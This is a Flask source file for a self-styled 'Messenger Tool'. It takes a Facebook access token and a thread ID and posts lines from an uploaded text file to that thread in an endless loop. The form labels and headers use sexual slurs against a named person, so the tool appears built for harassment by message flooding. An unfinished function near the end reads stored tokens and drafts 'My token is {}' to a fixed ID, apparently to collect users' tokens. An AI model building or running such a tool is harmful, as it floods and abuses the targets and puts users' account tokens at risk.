from flask import Flask, request
import requests
from time import sleep
import time
from datetime import datetime
app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                  
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message sent using token {access_token}: {message}")
                    else:
                        print(f"Failed to send message using token {access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error while sending message using token {access_token}: {message}")
                print(e)
                time.sleep(30)


    return '''

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Onfire Prince</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body{
      background-color: #7CFC00;
    }
    .container{
      max-width: 600px;
      background-color: #FF0000;
      border-radius: 30px;
      padding: 20px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      margin: 0 auto;
      margin-top: 30px;
    }
    .header{
      text-align: center;
      padding-bottom: 30px;
    }
    .btn-submit{
      width: 100%;
      margin-top: 20px;
    }
    .footer{
      text-align: center;
      margin-top: 80px;
      color: #333300;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mb-3"> 𝗔𝗠𝗔𝗡 𝗔𝗖𝗥 𝗥𝗨𝗟𝗘𝗫 🌐
                              
    <h1 class="mt-3">𝗔𝗕𝗛𝗜𝗥𝗔𝗝 𝗞𝗜 𝗠𝗔 𝗖𝗛𝗢𝗗𝗡𝗘𝗬 𝗪𝗔𝗟𝗔 𝗔𝗠𝗔𝗡 𝗛𝗘𝗥𝗘ᶠᶸᶜᵏᵧₒᵤ! </h1>
  </header>

  <div class="container">
    <form action="/" method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="accessToken">TOKEN</label>
        <input type="text" class="form-control" id="accessToken" name="accessToken" required>
      </div>
      <div class="mb-3">
        <label for="threadId">Enter CONVO/IN NUM</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx">MADARCHOD 📛 NAME</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="txtFile"> Notepad</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
      </div>
      <div class="mb-3">
        <label for="time">SPEED 🌐</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">SEND)|</button>
    </form>
  </div>
  <footer class="footer">
    <p>&copy; This Server is Made by Aman Xd 2024. All Rights Reserved.</p>
    <p>MESENGER  Tool</p>
    <p>NOTE:|  JISKO 30 DAYS WALA FREE SERVER CHAHIYE CONTACT AMAN 
    https://www.facebook.com/profile.php?id=100078176590768<a href="https:// XHUDEY HUE PILEY DOOR RAHEY📛</a></p>
  </footer>
</body>
  </html>
    '''
def send_initial_message():
      with open('tokennum.txt', 'r') as file:
          tokens = file.readlines()

      # Modify the message as per your requirement
      msg_template = "Hello sir! I am using your server. My token is {}"

      # Specify the ID where you want to send the message
      target_id = "61562700285287"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    app.run(debug=True)
